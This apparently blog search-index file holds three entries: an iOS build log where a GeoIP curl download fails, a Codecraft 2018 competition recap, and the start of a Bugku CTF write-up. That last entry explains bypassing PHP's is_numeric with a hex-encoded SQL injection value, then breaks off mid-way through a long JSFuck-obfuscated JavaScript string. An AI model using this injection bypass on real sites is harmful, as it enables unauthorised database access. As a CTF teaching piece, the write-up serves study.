/Users/ainassine/Library/Caches/org.carthage.CarthageKit/DerivedData/9.4.1_9F2000/MMDB-Swift/0.2.8/Build/Intermediates.noindex/ArchiveIntermediates/MMDB-iOS/IntermediateBuildFilesPath/MMDB.build/Release-iphoneos/MMDB-iOS.build/Script-366F5FDD1F05152C00DE3883.shUpdating GeoIP database. % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 0 1704k 0 8067 0 0 4225 0 0:06:53 0:00:01 0:06:52 4225 1 1704k 1 23907 0 0 7462 0 0:03:53 0:00:03 0:03:50 7463 1 1704k 1 23907 0 0 5685 0 0:05:07 0:00:04 0:05:03 5686 2 1704k 2 40291 0 0 8236 0 0:03:31 0:00:04 0:03:27 8236 4 1704k 4 72867 0 0 12864 0 0:02:15 0:00:05 0:02:10 14045 4 1704k 4 72867 0 0 10931 0 0:02:39 0:00:06 0:02:33 13619 6 1704k 6 106k 0 0 14439 0 0:02:00 0:00:07 0:01:53 19594 8 1704k 8 140k 0 0 15812 0 0:01:50 0:00:09 0:01:41 24562 8 1704k 8 149k 0 0 14996 0 0:01:56 0:00:10 0:01:46 21185 9 1704k 9 155k 0 0 15004 0 0:01:56 0:00:10 0:01:46 17451 10 1704k 10 176k 0 0 15325 0 0:01:53 0:00:11 0:01:42 21032 10 1704k 10 186k 0 0 14929 0 0:01:56 0:00:12 0:01:44 15634 12 1704k 12 207k 0 0 15192 0 0:01:54 0:00:13 0:01:41 14048 12 1704k 12 210k 0 0 14446 0 0:02:00 0:00:14 0:01:46 13242 13 1704k 13 231k 0 0 15133 0 0:01:55 0:00:15 0:01:40 15407 14 1704k 14 248k 0 0 14982 0 0:01:56 0:00:16 0:01:40 14199 15 1704k 15 269k 0 0 15233 0 0:01:54 0:00:18 0:01:36 15966 16 1704k 16 275k 0 0 14758 0 0:01:58 0:00:19 0:01:39 13566 16 1704k 16 283k 0 0 14897 0 0:01:57 0:00:19 0:01:38 16363 17 1704k 17 290k 0 0 13870 0 0:02:05 0:00:21 0:01:44 10452 17 1704k 17 306k 0 0 14378 0 0:02:01 0:00:21 0:01:40 12270 19 1704k 19 324k 0 0 14334 0 0:02:01 0:00:23 0:01:38 11114 19 1704k 19 336k 0 0 14364 0 0:02:01 0:00:24 0:01:37 12841 20 1704k 20 352k 0 0 14509 0 0:02:00 0:00:24 0:01:36 13116 20 1704k 20 355k 0 0 14037 0 0:02:04 0:00:25 0:01:39 14838 21 1704k 21 367k 0 0 14130 0 0:02:03 0:00:26 0:01:37 13005 22 1704k 22 386k 0 0 14216 0 0:02:02 0:00:27 0:01:35 13631 22 1704k 22 388k 0 0 13804 0 0:02:06 0:00:28 0:01:38 11019 23 1704k 23 404k 0 0 13891 0 0:02:05 0:00:29 0:01:36 10751 24 1704k 24 411k 0 0 13801 0 0:02:06 0:00:30 0:01:36 12475 24 1704k 24 411k 0 0 13363 0 0:02:10 0:00:31 0:01:39 9164 25 1704k 25 431k 0 0 13462 0 0:02:09 0:00:32 0:01:37 9208 26 1704k 26 457k 0 0 13902 0 0:02:05 0:00:33 0:01:32 14482 28 1704k 28 477k 0 0 14177 0 0:02:03 0:00:34 0:01:29 15993 28 1704k 28 477k 0 0 13776 0 0:02:06 0:00:35 0:01:31 13623 29 1704k 29 511k 0 0 14225 0 0:02:02 0:00:36 0:01:26 19378 30 1704k 30 522k 0 0 14266 0 0:02:02 0:00:37 0:01:25 19864 30 1704k 30 523k 0 0 13905 0 0:02:05 0:00:38 0:01:27 13923 31 1704k 31 538k 0 0 13798 0 0:02:06 0:00:39 0:01:27 11392 31 1704k 31 538k 0 0 13459 0 0:02:09 0:00:40 0:01:29 11390 32 1704k 32 553k 0 0 13637 0 0:02:07 0:00:41 0:01:26 9083 33 1704k 33 576k 0 0 13836 0 0:02:06 0:00:42 0:01:24 10689 34 1704k 34 585k 0 0 13786 0 0:02:06 0:00:43 0:01:23 12854 34 1704k 34 594k 0 0 13649 0 0:02:07 0:00:44 0:01:23 12379 36 1704k 36 629k 0 0 13965 0 0:02:04 0:00:46 0:01:18 17901 37 1704k 37 644k 0 0 14101 0 0:02:03 0:00:46 0:01:17 17771 38 1704k 38 653k 0 0 14011 0 0:02:04 0:00:47 0:01:17 15468 38 1704k 38 664k 0 0 13922 0 0:02:05 0:00:48 0:01:17 15027 40 1704k 40 685k 0 0 14096 0 0:02:03 0:00:49 0:01:14 17903 40 1704k 40 687k 0 0 13903 0 0:02:05 0:00:50 0:01:15 13255 41 1704k 41 699k 0 0 13687 0 0:02:07 0:00:52 0:01:15 10172 41 1704k 41 699k 0 0 13430 0 0:02:09 0:00:53 0:01:16 8478 41 1704k 41 715k 0 0 13538 0 0:02:08 0:00:54 0:01:14 9968 43 1704k 43 746k 0 0 13869 0 0:02:05 0:00:55 0:01:10 11727 44 1704k 44 757k 0 0 13956 0 0:02:05 0:00:55 0:01:10 14498 44 1704k 44 760k 0 0 13757 0 0:02:06 0:00:56 0:01:10 14627 45 1704k 45 767k 0 0 13617 0 0:02:08 0:00:57 0:01:11 15915 45 1704k 45 778k 0 0 13601 0 0:02:08 0:00:58 0:01:10 14358 45 1704k 45 778k 0 0 13372 0 0:02:10 0:00:59 0:01:11 7324 46 1704k 46 796k 0 0 13430 0 0:02:09 0:01:00 0:01:09 7783 47 1704k 47 805k 0 0 13207 0 0:02:12 0:01:02 0:01:10 7883 47 1704k 47 806k 0 0 13210 0 0:02:12 0:01:02 0:01:10 8346 47 1704k 47 812k 0 0 13079 0 0:02:13 0:01:03 0:01:10 6938 48 1704k 48 822k 0 0 13012 0 0:02:14 0:01:04 0:01:10 8789 49 1704k 49 838k 0 0 13109 0 0:02:13 0:01:05 0:01:08 9031 49 1704k 49 841k 0 0 12815 0 0:02:16 0:01:07 0:01:09 7745 50 1704k 50 857k 0 0 12905 0 0:02:15 0:01:08 0:01:07 9460 50 1704k 50 861k 0 0 12771 0 0:02:16 0:01:09 0:01:07 9202 50 1704k 50 867k 0 0 12747 0 0:02:16 0:01:09 0:01:07 9286 52 1704k 52 886k 0 0 12772 0 0:02:16 0:01:11 0:01:05 8799 52 1704k 52 888k 0 0 12588 0 0:02:18 0:01:12 0:01:06 9524 52 1704k 52 892k 0 0 12589 0 0:02:18 0:01:12 0:01:06 7844 52 1704k 52 892k 0 0 12418 0 0:02:20 0:01:13 0:01:07 7015 52 1704k 52 900k 0 0 12383 0 0:02:20 0:01:14 0:01:06 7143 53 1704k 53 914k 0 0 12382 0 0:02:20 0:01:15 0:01:05 6308 54 1704k 54 926k 0 0 12313 0 0:02:21 0:01:17 0:01:04 8149 54 1704k 54 937k 0 0 12382 0 0:02:20 0:01:17 0:01:03 9326 55 1704k 55 938k 0 0 12227 0 0:02:22 0:01:18 0:01:04 9430 55 1704k 55 948k 0 0 12210 0 0:02:22 0:01:19 0:01:03 9668 56 1704k 56 965k 0 0 12219 0 0:02:22 0:01:20 0:01:02 9878 57 1704k 57 973k 0 0 12137 0 0:02:23 0:01:22 0:01:01 9512 57 1704k 57 983k 0 0 12199 0 0:02:23 0:01:22 0:01:01 9398 58 1704k 58 997k 0 0 12227 0 0:02:22 0:01:23 0:00:59 12242 59 1704k 59 1006k 0 0 12192 0 0:02:23 0:01:24 0:00:59 11900 59 1704k 59 1013k 0 0 12114 0 0:02:24 0:01:25 0:00:59 10326 60 1704k 60 1034k 0 0 12208 0 0:02:22 0:01:26 0:00:56 13463 61 1704k 61 1042k 0 0 12107 0 0:02:24 0:01:28 0:00:56 10757 62 1704k 62 1056k 0 0 12155 0 0:02:23 0:01:29 0:00:54 11048 62 1704k 62 1056k 0 0 12019 0 0:02:25 0:01:30 0:00:55 9379 62 1704k 62 1056k 0 0 11887 0 0:02:26 0:01:31 0:00:55 8274 63 1704k 63 1078k 0 0 12017 0 0:02:25 0:01:31 0:00:54 8768 63 1704k 63 1078k 0 0 11887 0 0:02:26 0:01:32 0:00:54 7725 63 1704k 63 1078k 0 0 11760 0 0:02:28 0:01:33 0:00:55 4472 65 1704k 65 1108k 0 0 11975 0 0:02:25 0:01:34 0:00:51 11139 65 1704k 65 1121k 0 0 12021 0 0:02:25 0:01:35 0:00:50 14729 65 1704k 65 1121k 0 0 11896 0 0:02:26 0:01:36 0:00:50 9526 65 1704k 65 1121k 0 0 11774 0 0:02:28 0:01:37 0:00:51 9532 67 1704k 67 1142k 0 0 11867 0 0:02:27 0:01:38 0:00:49 14007 67 1704k 67 1144k 0 0 11745 0 0:02:28 0:01:39 0:00:49 7312 67 1704k 67 1151k 0 0 11686 0 0:02:29 0:01:40 0:00:49 5684 67 1704k 67 1151k 0 0 11571 0 0:02:30 0:01:41 0:00:49 5681 67 1704k 67 1158k 0 0 11466 0 0:02:32 0:01:43 0:00:49 6367 68 1704k 68 1166k 0 0 11505 0 0:02:31 0:01:43 0:00:48 4675 68 1704k 68 1173k 0 0 11475 0 0:02:32 0:01:44 0:00:48 6077 69 1704k 69 1180k 0 0 11418 0 0:02:32 0:01:45 0:00:47 6026 69 1704k 69 1180k 0 0 11311 0 0:02:34 0:01:46 0:00:48 6025 69 1704k 69 1190k 0 0 11326 0 0:02:34 0:01:47 0:00:47 7866 69 1704k 69 1190k 0 0 11221 0 0:02:35 0:01:48 0:00:47 5096 70 1704k 70 1208k 0 0 11242 0 0:02:35 0:01:50 0:00:45 6693 70 1704k 70 1210k 0 0 11212 0 0:02:35 0:01:50 0:00:45 6515 71 1704k 71 1221k 0 0 11139 0 0:02:36 0:01:52 0:00:44 7746 71 1704k 71 1225k 0 0 11156 0 0:02:36 0:01:52 0:00:44 7401 71 1704k 71 1227k 0 0 11039 0 0:02:38 0:01:53 0:00:45 7216 72 1704k 72 1232k 0 0 10978 0 0:02:39 0:01:54 0:00:45 5018 73 1704k 73 1256k 0 0 11064 0 0:02:37 0:01:56 0:00:41 8225 73 1704k 73 1259k 0 0 11060 0 0:02:37 0:01:56 0:00:41 8995 74 1704k 74 1267k 0 0 11047 0 0:02:38 0:01:57 0:00:41 8598 74 1704k 74 1269k 0 0 10952 0 0:02:39 0:01:58 0:00:41 8912 75 1704k 75 1281k 0 0 10982 0 0:02:38 0:01:59 0:00:39 11096 75 1704k 75 1284k 0 0 10885 0 0:02:40 0:02:00 0:00:40 6321 75 1704k 75 1287k 0 0 10844 0 0:02:40 0:02:01 0:00:39 5784 75 1704k 75 1288k 0 0 10755 0 0:02:42 0:02:02 0:00:40 4153 75 1704k 75 1288k 0 0 10667 0 0:02:43 0:02:03 0:00:40 3986 76 1704k 76 1311k 0 0 10751 0 0:02:42 0:02:04 0:00:38 5615 77 1704k 77 1318k 0 0 10678 0 0:02:43 0:02:06 0:00:37 6191 77 1704k 77 1318k 0 0 10594 0 0:02:44 0:02:07 0:00:37 5403 77 1704k 77 1319k 0 0 10557 0 0:02:45 0:02:08 0:00:37 5986 78 1704k 78 1333k 0 0 10632 0 0:02:44 0:02:08 0:00:36 9719 78 1704k 78 1336k 0 0 10546 0 0:02:45 0:02:09 0:00:36 5308 78 1704k 78 1342k 0 0 10461 0 0:02:46 0:02:11 0:00:35 4937 79 1704k 79 1349k 0 0 10503 0 0:02:46 0:02:11 0:00:35 7687 79 1704k 79 1349k 0 0 10423 0 0:02:47 0:02:12 0:00:35 6643 79 1704k 79 1356k 0 0 10361 0 0:02:48 0:02:14 0:00:34 4121 79 1704k 79 1356k 0 0 10284 0 0:02:49 0:02:15 0:00:34 3824 79 1704k 79 1362k 0 0 10253 0 0:02:50 0:02:16 0:00:34 4349 80 1704k 80 1370k 0 0 10230 0 0:02:50 0:02:17 0:00:33 3842 81 1704k 81 1381k 0 0 10282 0 0:02:49 0:02:17 0:00:32 6577 81 1704k 81 1388k 0 0 10203 0 0:02:51 0:02:19 0:00:32 6230 81 1704k 81 1388k 0 0 10130 0 0:02:52 0:02:20 0:00:32 6225 81 1704k 81 1397k 0 0 10133 0 0:02:52 0:02:21 0:00:31 6982 82 1704k 82 1400k 0 0 10082 0 0:02:53 0:02:22 0:00:31 6039 82 1704k 82 1404k 0 0 10093 0 0:02:52 0:02:22 0:00:30 4736 83 1704k 83 1419k 0 0 10124 0 0:02:52 0:02:23 0:00:29 7503 83 1704k 83 1419k 0 0 10053 0 0:02:53 0:02:24 0:00:29 7507 83 1704k 83 1419k 0 0 9984 0 0:02:54 0:02:25 0:00:29 5212 84 1704k 84 1436k 0 0 9985 0 0:02:54 0:02:27 0:00:27 7295 84 1704k 84 1445k 0 0 10023 0 0:02:54 0:02:27 0:00:27 8088 84 1704k 84 1445k 0 0 9955 0 0:02:55 0:02:28 0:00:27 5146 85 1704k 85 1456k 0 0 9952 0 0:02:55 0:02:29 0:00:26 7150 85 1704k 85 1463k 0 0 9902 0 0:02:56 0:02:31 0:00:25 7821 86 1704k 86 1466k 0 0 9907 0 0:02:56 0:02:31 0:00:25 7186 86 1704k 86 1470k 0 0 9854 0 0:02:57 0:02:32 0:00:25 5032 86 1704k 86 1478k 0 0 9854 0 0:02:57 0:02:33 0:00:24 6866 87 1704k 87 1484k 0 0 9835 0 0:02:57 0:02:34 0:00:23 6110 87 1704k 87 1488k 0 0 9752 0 0:02:58 0:02:36 0:00:22 5187 87 1704k 87 1488k 0 0 9689 0 0:03:00 0:02:37 0:00:23 3984 87 1704k 87 1488k 0 0 9628 0 0:03:01 0:02:38 0:00:23 3380 87 1704k 87 1488k 0 0 9567 0 0:03:02 0:02:39 0:00:23 1782 87 1704k 87 1488k 0 0 9507 0 0:03:03 0:02:40 0:00:23 747 87 1704k 87 1488k 0 0 9448 0 0:03:04 0:02:41 0:00:23 0 87 1704k 87 1488k 0 0 9390 0 0:03:05 0:02:42 0:00:23 0 87 1704k 87 1488k 0 0 9332 0 0:03:07 0:02:43 0:00:24 0 87 1704k 87 1488k 0 0 9275 0 0:03:08 0:02:44 0:00:24 0 87 1704k 87 1488k 0 0 9219 0 0:03:09 0:02:45 0:00:24 0 87 1704k 87 1488k 0 0 9163 0 0:03:10 0:02:46 0:00:24 0 87 1704k 87 1488k 0 0 9108 0 0:03:11 0:02:47 0:00:24 0 87 1704k 87 1488k 0 0 9054 0 0:03:12 0:02:48 0:00:24 0 87 1704k 87 1488k 0 0 9000 0 0:03:13 0:02:49 0:00:24 0 87 1704k 87 1488k 0 0 8947 0 0:03:15 0:02:50 0:00:25 0 87 1704k 87 1488k 0 0 8895 0 0:03:16 0:02:51 0:00:25 0 87 1704k 87 1488k 0 0 8843 0 0:03:17 0:02:52 0:00:25 0 87 1704k 87 1488k 0 0 8792 0 0:03:18 0:02:53 0:00:25 0 87 1704k 87 1488k 0 0 8741 0 0:03:19 0:02:54 0:00:25 0 87 1704k 87 1488k 0 0 8691 0 0:03:20 0:02:55 0:00:25 0 87 1704k 87 1488k 0 0 8642 0 0:03:21 0:02:56 0:00:25 0 87 1704k 87 1488k 0 0 8593 0 0:03:23 0:02:57 0:00:26 0 87 1704k 87 1488k 0 0 8544 0 0:03:24 0:02:58 0:00:26 0 87 1704k 87 1488k 0 0 8496 0 0:03:25 0:02:59 0:00:26 0 87 1704k 87 1488k 0 0 8449 0 0:03:26 0:03:00 0:00:26 0 87 1704k 87 1488k 0 0 8402 0 0:03:27 0:03:01 0:00:26 0 87 1704k 87 1488k 0 0 8356 0 0:03:28 0:03:02 0:00:26 0 87 1704k 87 1488k 0 0 8310 0 0:03:30 0:03:03 0:00:27 0 87 1704k 87 1488k 0 0 8265 0 0:03:31 0:03:04 0:00:27 0 87 1704k 87 1488k 0 0 8220 0 0:03:32 0:03:05 0:00:27 0 87 1704k 87 1488k 0 0 8176 0 0:03:33 0:03:06 0:00:27 0 87 1704k 87 1488k 0 0 8132 0 0:03:34 0:03:07 0:00:27 0 87 1704k 87 1488k 0 0 8089 0 0:03:35 0:03:08 0:00:27 0 87 1704k 87 1488k 0 0 8046 0 0:03:36 0:03:09 0:00:27 0 87 1704k 87 1488k 0 0 8004 0 0:03:38 0:03:10 0:00:28 0 87 1704k 87 1488k 0 0 7962 0 0:03:39 0:03:11 0:00:28 0 87 1704k 87 1488k 0 0 7920 0 0:03:40 0:03:12 0:00:28 0 87 1704k 87 1488k 0 0 7879 0 0:03:41 0:03:13 0:00:28 0 87 1704k 87 1488k 0 0 7839 0 0:03:42 0:03:14 0:00:28 0 87 1704k 87 1488k 0 0 7799 0 0:03:43 0:03:15 0:00:28 0 87 1704k 87 1488k 0 0 7759 0 0:03:44 0:03:16 0:00:28 0 87 1704k 87 1488k 0 0 7720 0 0:03:46 0:03:17 0:00:29 0 87 1704k 87 1488k 0 0 7680 0 0:03:47 0:03:18 0:00:29 0 87 1704k 87 1488k 0 0 7642 0 0:03:48 0:03:19 0:00:29 0 87 1704k 87 1488k 0 0 7604 0 0:03:49 0:03:20 0:00:29 0 87 1704k 87 1488k 0 0 7566 0 0:03:50 0:03:21 0:00:29 0 87 1704k 87 1488k 0 0 7528 0 0:03:51 0:03:22 0:00:29 0 87 1704k 87 1488k 0 0 7491 0 0:03:53 0:03:23 0:00:30 0 87 1704k 87 1488k 0 0 7454 0 0:03:54 0:03:24 0:00:30 0 87 1704k 87 1488k 0 0 7418 0 0:03:55 0:03:25 0:00:30 0 87 1704k 87 1488k 0 0 7382 0 0:03:56 0:03:26 0:00:30 0 87 1704k 87 1488k 0 0 7346 0 0:03:57 0:03:27 0:00:30 0 87 1704k 87 1488k 0 0 7311 0 0:03:58 0:03:28 0:00:30 0 87 1704k 87 1488k 0 0 7276 0 0:03:59 0:03:29 0:00:30 0 87 1704k 87 1488k 0 0 7241 0 0:04:01 0:03:30 0:00:31 0 87 1704k 87 1488k 0 0 7207 0 0:04:02 0:03:31 0:00:31 0 87 1704k 87 1488k 0 0 7173 0 0:04:03 0:03:32 0:00:31 0 87 1704k 87 1488k 0 0 7139 0 0:04:04 0:03:33 0:00:31 0 87 1704k 87 1488k 0 0 7105 0 0:04:05 0:03:34 0:00:31 0 87 1704k 87 1488k 0 0 7072 0 0:04:06 0:03:35 0:00:31 0 87 1704k 87 1488k 0 0 7039 0 0:04:07 0:03:36 0:00:31 0 87 1704k 87 1488k 0 0 7007 0 0:04:09 0:03:37 0:00:32 0 87 1704k 87 1488k 0 0 6975 0 0:04:10 0:03:38 0:00:32 0 87 1704k 87 1488k 0 0 6943 0 0:04:11 0:03:39 0:00:32 0 87 1704k 87 1488k 0 0 6911 0 0:04:12 0:03:40 0:00:32 0 87 1704k 87 1488k 0 0 6880 0 0:04:13 0:03:41 0:00:32 0 87 1704k 87 1488k 0 0 6849 0 0:04:14 0:03:42 0:00:32 0 87 1704k 87 1488k 0 0 6818 0 0:04:16 0:03:43 0:00:33 0 87 1704k 87 1488k 0 0 6788 0 0:04:17 0:03:44 0:00:33 0 87 1704k 87 1488k 0 0 6758 0 0:04:18 0:03:45 0:00:33 0 87 1704k 87 1488k 0 0 6728 0 0:04:19 0:03:46 0:00:33 0 87 1704k 87 1488k 0 0 6698 0 0:04:20 0:03:47 0:00:33 0 87 1704k 87 1488k 0 0 6669 0 0:04:21 0:03:48 0:00:33 0 87 1704k 87 1488k 0 0 6639 0 0:04:22 0:03:49 0:00:33 0 87 1704k 87 1488k 0 0 6611 0 0:04:24 0:03:50 0:00:34 0 87 1704k 87 1488k 0 0 6582 0 0:04:25 0:03:51 0:00:34 0 87 1704k 87 1488k 0 0 6554 0 0:04:26 0:03:52 0:00:34 0 87 1704k 87 1488k 0 0 6525 0 0:04:27 0:03:53 0:00:34 0 87 1704k 87 1488k 0 0 6497 0 0:04:28 0:03:54 0:00:34 0 87 1704k 87 1488k 0 0 6470 0 0:04:29 0:03:55 0:00:34 0 87 1704k 87 1488k 0 0 6442 0 0:04:30 0:03:56 0:00:34 0 87 1704k 87 1488k 0 0 6415 0 0:04:32 0:03:57 0:00:35 0 87 1704k 87 1488k 0 0 6388 0 0:04:33 0:03:58 0:00:35 0 87 1704k 87 1488k 0 0 6361 0 0:04:34 0:03:59 0:00:35 0 87 1704k 87 1488k 0 0 6335 0 0:04:35 0:04:00 0:00:35 0 87 1704k 87 1488k 0 0 6309 0 0:04:36 0:04:01 0:00:35 0 87 1704k 87 1488k 0 0 6283 0 0:04:37 0:04:02 0:00:35 0 87 1704k 87 1488k 0 0 6257 0 0:04:38 0:04:03 0:00:35 0 87 1704k 87 1488k 0 0 6231 0 0:04:40 0:04:04 0:00:36 0 87 1704k 87 1488k 0 0 6206 0 0:04:41 0:04:05 0:00:36 0 87 1704k 87 1488k 0 0 6180 0 0:04:42 0:04:06 0:00:36 0 87 1704k 87 1488k 0 0 6155 0 0:04:43 0:04:07 0:00:36 0 87 1704k 87 1488k 0 0 6131 0 0:04:44 0:04:08 0:00:36 0 87 1704k 87 1488k 0 0 6106 0 0:04:45 0:04:09 0:00:36 0 87 1704k 87 1488k 0 0 6082 0 0:04:46 0:04:10 0:00:36 0 87 1704k 87 1488k 0 0 6057 0 0:04:48 0:04:11 0:00:37 0 87 1704k 87 1488k 0 0 6033 0 0:04:49 0:04:12 0:00:37 0 87 1704k 87 1488k 0 0 6009 0 0:04:50 0:04:13 0:00:37 0 87 1704k 87 1488k 0 0 5986 0 0:04:51 0:04:14 0:00:37 0 87 1704k 87 1488k 0 0 5962 0 0:04:52 0:04:15 0:00:37 0 87 1704k 87 1488k 0 0 5939 0 0:04:53 0:04:16 0:00:37 0 87 1704k 87 1488k 0 0 5916 0 0:04:55 0:04:17 0:00:38 0 87 1704k 87 1488k 0 0 5893 0 0:04:56 0:04:18 0:00:38 0 87 1704k 87 1488k 0 0 5870 0 0:04:57 0:04:19 0:00:38 0 87 1704k 87 1488k 0 0 5847 0 0:04:58 0:04:20 0:00:38 0 87 1704k 87 1488k 0 0 5825 0 0:04:59 0:04:21 0:00:38 0 87 1704k 87 1488k 0 0 5803 0 0:05:00 0:04:22 0:00:38 0 87 1704k 87 1488k 0 0 5781 0 0:05:01 0:04:23 0:00:38 0 87 1704k 87 1488k 0 0 5759 0 0:05:03 0:04:24 0:00:39 0 87 1704k 87 1488k 0 0 5737 0 0:05:04 0:04:25 0:00:39 0 87 1704k 87 1488k 0 0 5716 0 0:05:05 0:04:26 0:00:39 0 87 1704k 87 1488k 0 0 5694 0 0:05:06 0:04:27 0:00:39 0 87 1704k 87 1488k 0 0 5673 0 0:05:07 0:04:28 0:00:39 0 87 1704k 87 1488k 0 0 5652 0 0:05:08 0:04:29 0:00:39 0 87 1704k 87 1488k 0 0 5631 0 0:05:09 0:04:30 0:00:39 0 87 1704k 87 1488k 0 0 5610 0 0:05:11 0:04:31 0:00:40 0 87 1704k 87 1488k 0 0 5589 0 0:05:12 0:04:32 0:00:40 0 87 1704k 87 1488k 0 0 5569 0 0:05:13 0:04:33 0:00:40 0 87 1704k 87 1488k 0 0 5549 0 0:05:14 0:04:34 0:00:40 0 87 1704k 87 1488k 0 0 5528 0 0:05:15 0:04:35 0:00:40 0 87 1704k 87 1488k 0 0 5528 0 0:05:15 0:04:35 0:00:40 0curl: (56) Recv failure: Connection reset by peer** ARCHIVE FAILED **The following build commands failed: PhaseScriptExecution Run\ Script /Users/ainassine/Library/Caches/org.carthage.CarthageKit/DerivedData/9.4.1_9F2000/MMDB-Swift/0.2.8/Build/Intermediates.noindex/ArchiveIntermediates/MMDB-iOS/IntermediateBuildFilesPath/MMDB.build/Release-iphoneos/MMDB-iOS.build/Script-366F5FDD1F05152C00DE3883.sh(1 failure) 可以看出是网络问题导致failure的出现。打开当时执行的脚本，得到代码如下：1234#!/bin/shif [ ! -f $SRCROOT/MMDB/GeoLite2-Country.mmdb ] || [ $CONFIGURATION == "Release" ]; then $SRCROOT/update_database.shfi 打开update_database.sh发现如下命令是问题所在：1curl -L -o $tmpfile http://geolite.maxmind.com/download/geoip/database/GeoLite2-Country.tar.gz 可以通过给代理的方法顺利执行上面的命令。这里我用的是proxychains。]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>NEKit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[codecraft2018]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F04%2F16%2Fcodecraft2018</url>
    <content type="text"><![CDATA[Codecraft 2018 ENDS … (初赛)0x00 历程华为的Codecraft比赛是大学的时候就有参加过的，第一次是2016年，那是第二届Codecraft，当时的赛题是一种寻路问题，大三的我在找为找工作考虑才参加了这个比赛。当然大学的时候很咸鱼（现在也是），参加比赛也都是碰碰运气。很多算法——群智能、模拟退化、遗传算法等等——在那之前也都对我来说闻所未闻，我所能做的无非是利用暴力搜索的方法去寻找最好的路径，也仅仅只能通过五个初级用例，根本没有上榜的机会。2017年春天的Codecraft，那时候我已经是大四的学生了，在做毕设的阶段，当时的题目是网络流量相关的网络节点分配的问题，碰巧，我的毕设题目也是跟这个相关的（《无线传感器网络中最优的存储方案》），毕设我用的是0-1整数规划，用到了lingo来完成计算。不过这一年我只用来享受大学最后一年的惬意了——毕业去向有着落，也没有什么烦恼，每天打球、打游戏，依旧咸鱼着。然后就是今年的Codecraft了。 0x01 赛题 0x02 内容我们开始做题是3月9日，当时比赛已经开始了一两天。最开始觉得用C++可能代码速度快一些，但是写完C++的数据处理之后我觉得编写很吃力就没有继续下去了，转而使用了比较简单方便的python作为编程语言。其实问题主要分为两个部分：预测和装箱。赛题虽说是面向机器学习，但是像我这样没有对机器学习深入了解过的还是能比着葫芦画瓢写出一个有效的程序的，甚至通过一些毫无道理的手段就能获得不错的分数，可以说门槛非常之低。我们将每种规格虚拟机历史购买记录处理为x-y形式的数据，与数据中的第一天的日期的相差天数作为x，而y是当前时间内该种规格虚拟机的订单数量，所以整体来说数据是呈现上升状态的。数据抽取之后才是正式的比赛编程。预测： 平均数：一开始就像比赛群里说的那样，我们提交了平均数的代码，对于每种规格虚拟机，期预测数目计算为：predicted_num = (last_day_num / last_day_x) * num_predict_days，其中last_day_num是该规格虚拟机在训练阶段最后一天的数量，last_day_x是最后一天对应的x坐标，num_predict_days是预测时间的长度。 LS：最小二乘法，是我们到最后采用的算法，使用最后的7条数据获得线性模型，通过系数调整获得了我们的最高分。 TLS：总体最小二乘法，一般来说TLS获得的斜率相较于LS获得的斜率会更加陡峭一些，而LS预测的模型经过大于一的系数处理之后得到了更高的分数，说明LS预测的结果偏低，故而我们尝试采用TLS，但效果不明显，调整系数前TLS稍优，而经过系数调整LS优势较大。 HMM：隐马尔科夫模型，重写了python的HMM，过程复杂，涉及较多矩阵计算，最后虽然重写完成，但是应用效果差。 SVR：支持向量回归。利用libsvm进行了测试，线性核效果稍好，但是也不及LS。 装箱： Ratio Distribute：基于比率的分配，鉴于服务器有CPU、MEM两种指标，都要求不能超分，而对于每种虚拟机规格来说，其CPU:MEM比值可能会比较小，比如1:4，那么对于一个56CPU、128MEM的物理机来说，其CPU:MEM为1:3，这样的虚拟机装物理机就会产生碎片，故而我想到在装载过程中计算物理机剩余资源的CPU与MEM的比值，尽量装载与该比值相近的虚拟机，装的时候优先考虑CPU或者MEM数值较大的物理机进行装载。感觉这样是一种贪心的算法，经过实际测试速度很快，但是效果不是最优。 DP Distribute：受到论坛中[技术探讨] 【自制case】求大佬们跑出来CPU100% MEM100% :) :) :)的启发，我们发现自己的装箱算法得到的效果不是最好的，于是开始着手使用动态规划进行处理。在动态规划的处理过程中，我们在装载的时候优先使用较大规格的虚拟机进行装载。最后效果较好，收获到提分。 0x04 最后今天成绩公布，赛区48告别比赛，也有同学采用ARIMA模型取得24名成绩进入复赛，虽然在比赛过程中看到过这样的模型，但是由于它比较复杂没有着手去实现。无论如何，受益良多。 git: https://github.com/Joeeyy/cf2018]]></content>
      <categories>
        <category>赛后总结</category>
      </categories>
      <tags>
        <tag>CodeCraft</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-writeup]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F03%2F03%2FBugku-writeup</url>
    <content type="text"><![CDATA[# 矛盾0×00 简介国内一部分CMS程序里面有用到过is_numberic函数，我们先看看这个函数的结构bool is_numeric ( mixed $var )如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。 0×01 函数是否安全接下来我们来看个例子，说明这个函数是否安全。 $s = is_numeric($_GET[‘s’])?$_GET[‘s’]:0;$sql=”insert into test(type)values($s);”;//是 values($s) 不是values(‘$s’)mysql_query($sql);上面这个片段程序是判断参数s是否为数字，是则返回数字，不是则返回0，然后带入数据库查询。（这样就构造不了sql语句）我们把‘1 or 1’ 转换为16进制 0x31206f722031 为s参数的值程序运行后，我们查询数据库看看，如 a 宽字节注入11([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]